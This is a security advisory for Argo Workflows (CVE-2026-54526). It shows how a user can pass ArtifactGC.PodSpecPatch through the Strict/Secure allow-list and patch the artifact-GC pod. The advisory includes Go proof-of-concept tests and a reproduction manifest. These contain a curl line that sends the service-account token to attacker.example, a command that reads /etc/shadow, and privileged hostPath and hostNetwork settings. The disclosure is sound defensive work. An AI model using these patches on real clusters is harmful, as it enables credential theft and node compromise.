# [H] Argo Workflows: ArtifactGC.PodSpecPatch bypasses Strict/Secure template reference allow-list (Incomplete fix for CVE-2026-31892)

## Summary
Severity: High
Advisory: GHSA-48p8-g2fx-3wwm
CVE: CVE-2026-54526
CWE: CWE-284
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:H (CVSS_V4)
Published: 2026-08-13
Source: https://github.com/advisories/GHSA-48p8-g2fx-3wwm
Type: github-advisory

## Affected
- Go: `github.com/argoproj/argo-workflows/v4` — affected >=4.0.0 <4.0.6
- Go: `github.com/argoproj/argo-workflows/v3` — affected >=0 <3.7.15
- Go: `github.com/argoproj/argo-workflows` — affected >=0

## Details
### Summary

The allow-list fix for CVE-2026-31892 (GHSA-3wf5-g532-rcrr), and its follow-up coverage of `hostNetwork`/`securityContext`/`serviceAccountName` in GHSA-3775-99mw-8rp4, is incomplete. `workflow/util/merge.go` `ValidateUserOverrides` / `SanitizeUserWorkflowSpec` walk only the top-level fields of `WorkflowSpec` via reflection. `WorkflowSpec.ArtifactGC` is allow-listed because admins want users to configure artifact garbage collection. The struct behind that field, `WorkflowLevelArtifactGC`, has a `PodSpecPatch` sub-field whose contents flow unmodified into `util.ApplyPodSpecPatch` on the artifact-GC pod - the same sink the original fix closed for `WorkflowSpec.PodSpecPatch`. A user submitting a Workflow under `templateReferencing: Strict` or `Secure` can therefore still inject an arbitrary strategic merge patch into the artifact-GC pod (hostPath volumes, `privileged: true`, arbitrary image and command, `hostNetwork: true`), defeating the stated purpose of Strict/Secure reference mode.

### Details

Locations in `main` at `4d9f021` (HEAD 2026-04-23):

Allow-list and reflection scope - `workflow/util/merge.go:19-60`:

```go
var allowedUserOverrideFields = map[string]bool{
    "Arguments":             true,
    "Entrypoint":            true,
    ...
    "ArtifactGC":            true,   // <-- allow-listed wholesale
}

func ValidateUserOverrides(userSpec *wfv1.WorkflowSpec) error {
    v := reflect.ValueOf(userSpec).Elem()
    t := v.Type()
    zero := reflect.New(t).Elem()
    for i := 0; i < t.NumField(); i++ {
        fieldName := t.Field(i).Name
        if allowedUserOverrideFields[fieldName] {
            continue                  // <-- sub-fields are not walked
        }
        if !reflect.DeepEqual(v.Field(i).Interface(), zero.Field(i).Interface()) {
            violations = append(violations, fieldName)
        }
    }
    ...
}
```

The allow-listed type - `pkg/apis/workflow/v1alpha1/workflow_types.go:1207-1217`:

```go
type WorkflowLevelArtifactGC struct {
    ArtifactGC            `json:",inline"`
    ForceFinalizerRemoval bool   `json:"forceFinalizerRemoval,omitempty"`
    PodSpecPatch          string `json:"podSpecPatch,omitempty"`   // <-- sink input
}
```

The sink - `workflow/controller/artifact_gc.go:731-740` reads the user-controlled value:

```go
func (woc *wfOperationCtx) getArtifactGCPodInfo(artifact *wfv1.Artifact) podInfo {
    info := podInfo{}
    if woc.execWf.Spec.ArtifactGC != nil {
        woc.updateArtifactGCPodInfo(&woc.execWf.Spec.ArtifactGC.ArtifactGC, &info)
        info.podSpecPatch = woc.execWf.Spec.ArtifactGC.PodSpecPatch
    }
    ...
}
```

And `workflow/controller/artifact_gc.go:518-525` feeds it unchanged to the same helper that CVE-2026-31892 closed for the top-level field:

```go
if info.podSpecPatch != "" {
    patchedPodSpec, patchErr := util.ApplyPodSpecPatch(pod.Spec, info.podSpecPatch)
    if patchErr != nil {
        return nil, patchErr
    }
    pod.Spec = *patchedPodSpec
}
```

`util.ApplyPodSpecPatch` (`workflow/util/util.go:1560`) is a raw `strategicpatch.StrategicMergePatch` over the whole `apiv1.PodSpec` with no field-level restriction; it is the same primitive that was weaponized by the original CVE-2026-31892 against `WorkflowSpec.PodSpecPatch`. The pod it is applied to - built in `workflow/controller/artifact_gc.go` ~line 460-495 - has `AutomountServiceAccountToken: true` and a hardened `MinimalCtrSC()` security context that the patch fully overrides.

The merge path is the one the fix already walks. `operator.go:#setStoredWfSpec` does `SanitizeUserWorkflowSpec(&woc.wf.Spec)` before `JoinWorkflowSpec(userSpec, workflowTemplateSpec, wfDefaultSpec)`. `Sanitize` preserves `ArtifactGC` wholesale. `Join` uses `strategicpatch.StrategicMergePatch` with the user spec as the target, so the user's `artifactGC.podSpecPatch` value wins whenever it is non-empty.

Precondition for the attack: the referenced `WorkflowTemplate` has at least one template with an output artifact. `workflow/controller/artifact_gc.go:79` `HasArtifactGC` iterates `execWf.Spec.Templates[*].Outputs.Artifacts[*]` and asks `GetArtifactGCStrategy(&artifact)`, which falls back to `w.Spec.ArtifactGC.Strategy` when the per-artifact strategy is `Undefined` (`pkg/apis/workflow/v1alpha1/workflow_types.go:245`). The user supplies `spec.artifactGC.strategy: OnWorkflowCompletion` (in the allow-list) so the fallback is satisfied on any template that emits artifacts - the common case for real workloads.

No validation sits between sanitize and sink:

```
grep -rn "ValidateArtifactGC\|validateArtifactGC\|ArtifactGC.*PodSpecPatch" --include="*.go" workflow/validate/
# (no output)
```

The merge-package test file added with the fix (`workflow/util/merge_test.go` @ `4d9f021`) covers only `WorkflowSpec.PodSpecPatch`; `ArtifactGC.PodSpecPatch` is not exercised.

### PoC

Self-contained Go unit tests against the shipped `workflow/util` package at `main@4d9f021`. Drop either file into `workflow/util/` and run `go test`.

`poc/merge_artifactgc_poc_test.go`:

```go
package util

import (
    "testing"
    "github.com/stretchr/testify/assert"
    "github.com/stretchr/testify/require"
    wfv1 "github.com/argoproj/argo-workflows/v4/pkg/apis/workflow/v1alpha1"
)

func TestPoC_ArtifactGCPodSpecPatchPassesAllowList(t *testing.T) {
    attackerPatch := `{"containers":[{"name":"main","image":"attacker/evil:latest",` +
        `"command":["sh","-c","curl attacker.example/exfil -d @/var/run/secrets/kubernetes.io/serviceaccount/token"]}],` +
        `"hostNetwork":true}`
    userSpec := &wfv1.WorkflowSpec{
        WorkflowTemplateRef: &wfv1.WorkflowTemplateRef{Name: "safe-template"},
        ArtifactGC: &wfv1.WorkflowLevelArtifactGC{
            ArtifactGC:   wfv1.ArtifactGC{Strategy: wfv1.ArtifactGCOnWorkflowCompletion},
            PodSpecPatch: attackerPatch,
        },
    }

    // Gate 1: allow-list. Expected to reject - does not.
    require.NoError(t, ValidateUserOverrides(userSpec))

    // Gate 2: sanitizer defense-in-depth. Expected to strip - does not.
    sanitized := SanitizeUserWorkflowSpec(userSpec)
    assert.Equal(t, attackerPatch, sanitized.ArtifactGC.PodSpecPatch)
}
```

`poc/artgc_sink_poc_test.go` demonstrates the same patch reaching `ApplyPodSpecPatch` and mutating the hardened pod baseline (switches image, sets `privileged: true`, sets `hostNetwork: true`, adds a `hostPath: /` volume):

```go
func TestPoC_ArtifactGCPodSpecPatchReachesApplyPodSpecPatch(t *testing.T) {
    attackerPatch := `
containers:
- name: main
  image: attacker/evil:latest
  command: [sh, -c, "curl attacker.example/exfil -d @/var/run/secrets/kubernetes.io/serviceaccount/token"]
  securityContext:
    privileged: true
    runAsUser: 0
    runAsNonRoot: false
    allowPrivilegeEscalation: true
    capabilities: {drop: null, add: [SYS_ADMIN]}
    readOnlyRootFilesystem: false
hostNetwork: true
volumes:
- name: hostroot
  hostPath: {path: /}
`
    userSpec := &wfv1.WorkflowSpec{
        WorkflowTemplateRef: &wfv1.WorkflowTemplateRef{Name: "safe-template"},
        ArtifactGC: &wfv1.WorkflowLevelArtifactGC{
            ArtifactGC:   wfv1.ArtifactGC{Strategy: wfv1.ArtifactGCOnWorkflowCompletion},
            PodSpecPatch: attackerPatch,
        },
    }
    require.NoError(t, ValidateUserOverrides(userSpec))
    sanitized := SanitizeUserWorkflowSpec(userSpec)

    // Baseline built exactly like workflow/controller/artifact_gc.go:createArtifactGCPod.
    basePod := apiv1.PodSpec{ /* AutomountSAToken=true, MinimalCtrSC, limits, etc. */ }

    patched, err := ApplyPodSpecPatch(basePod, sanitized.ArtifactGC.PodSpecPatch)
    require.NoError(t, err)

    assert.Equal(t, "attacker/evil:latest",     patched.Containers[0].Image)
    assert.Equal(t, true, *patched.Containers[0].SecurityContext.Privileged)
    assert.Equal(t, true, patched.HostNetwork)
    assert.Equal(t, "/",  patched.Volumes[0].HostPath.Path)
}
```

Run:

```
go test -v -run "TestPoC_ArtifactGC" ./workflow/util/
```

Captured output:

```
=== RUN   TestPoC_ArtifactGCPodSpecPatchReachesApplyPodSpecPatch
--- PASS: TestPoC_ArtifactGCPodSpecPatchReachesApplyPodSpecPatch (0.00s)
=== RUN   TestPoC_ArtifactGCPodSpecPatchPassesAllowList
--- PASS: TestPoC_ArtifactGCPodSpecPatchPassesAllowList (0.00s)
PASS
ok  	github.com/argoproj/argo-workflows/v4/workflow/util	0.036s
```

End-to-end Workflow manifest (for a live cluster reproduction by maintainers):

```yaml
apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata: {name: safe-template}
spec:
  entrypoint: main
  templates:
    - name: main
      container: {image: argoexec:latest, command: [echo, hello]}
      outputs:
        artifacts:
          - {name: artifact, path: /tmp/artifact}
---
apiVersion: argoproj.io/v1alpha1
kind: Workflow
metadata: {generateName: bypass-}
spec:
  workflowTemplateRef: {name: safe-template}
  artifactGC:
    strategy: OnWorkflowCompletion
    podSpecPatch: |
      containers:
      - name: main
        image: attacker/evil:latest
        command: [sh, -c, "while true; do cat /host/etc/shadow; sleep 3600; done"]
      hostNetwork: true
      volumes:
      - name: hostroot
        hostPath: {path: /}
```

Controller config for the test cluster:

```yaml
workflowRestrictions:
  templateReferencing: Strict
```

With the fix for CVE-2026-31892 in place, submitting this Workflow is expected to fail validation (the fix explicitly advertises that Strict mode restricts users to admin-approved templates). It is accepted, and the artifact-GC pod that the controller creates on workflow completion picks up the attacker's image, command, hostPath mount, and hostNetwork.

### Impact

Under `templateReferencing: Strict` or `Secure`, the purpose of the allow-list introduced in `4d9f021` is to make `workflowTemplateRef` the sole mechanism by which a user can request Workflow execution and to block spec fields that let the user override the admin's container configuration. `ArtifactGC.PodSpecPatch` is exactly such an override: a strategic merge patch applied by the controller to the artifact-GC pod, with no schema-level restriction on what it may change. Any template whose authors have declared output artifacts - i.e., any workflow that produces data, which is the motivating Argo use case - gives the submitter a path to:

- run an attacker-chosen image as a container in the workflow's namespace, with `AutomountServiceAccountToken: true`, i.e. holding the artifact-GC pod's service-account token,
- bypass `common.MinimalCtrSC()` / `common.MinimalPodSC()` by setting `privileged: true`, `allowPrivilegeEscalation: true`, `runAsUser: 0`, `readOnlyRootFilesystem: false`, `capabilities.add: [SYS_ADMIN]`,
- mount `hostPath: /` into the pod (reads and writes to the kubelet's node filesystem, subject only to any cluster-level PSA/PSP the operator has enforced independently),
- enable `hostNetwork: true` (equivalent to being on the node's network for the lifetime of the pod).

This is the same class of impact the original CVE-2026-31892 (CVSS 8.9 - critical in the Strict-mode threat model) was rated for, against an identical sink. The fix blocks the top-level `PodSpecPatch` field but leaves a second call site with the same semantics reachable through an allow-listed sub-field.

A minimal fix is either (a) add a sub-field pass to `ValidateUserOverrides`/`SanitizeUserWorkflowSpec` that rejects/empties `ArtifactGC.PodSpecPatch` when `MustUseReference()` is true, or (b) gate the `if info.podSpecPatch != ""` branch in `createArtifactGCPod` on the same `WorkflowRestrictions.MustUseReference()` check so the sink itself refuses user-supplied patches in Strict/Secure mode.

CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H

## References
- https://github.com/argoproj/argo-workflows/security/advisories/GHSA-48p8-g2fx-3wwm
- https://nvd.nist.gov/vuln/detail/CVE-2026-54526
- https://github.com/argoproj/argo-workflows/commit/277e9cef0ad16d7eaaab253573d0695951a65dbd
- https://github.com/argoproj/argo-workflows/commit/358cc3968c8f06f1be0967e41df191088db0b662
- https://github.com/argoproj/argo-workflows
- https://github.com/argoproj/argo-workflows/releases/tag/v3.7.15
- https://github.com/argoproj/argo-workflows/releases/tag/v4.0.6
